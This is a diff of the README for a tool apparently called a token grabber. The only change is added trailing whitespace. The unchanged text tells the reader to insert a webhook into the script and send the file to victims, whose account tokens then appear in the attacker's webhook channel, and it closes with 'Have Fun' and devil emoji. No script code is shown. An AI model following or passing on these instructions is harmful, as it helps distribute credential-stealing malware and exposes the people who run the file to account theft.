@@ -11,10 +11,10 @@ Features:
 
 
 HOW SET UP :
-1.Open the File Token-Grabber-Kio.py with the Editor
-2.Paste the Webhook you created to ´´WEBHOOK HERE``
-3.Save the file
-4.Send the File to your victims and theyre token will appear in the Webhook Channel
+1.Open the File Token-Grabber-Kio.py with the Editor                                                      
+2.Paste the Webhook you created to ´´WEBHOOK HERE``                                                  
+3.Save the file                                                                        
+4.Send the File to your victims and theyre token will appear in the Webhook Channel                                                 
 
 
 Have Fun 😈👹
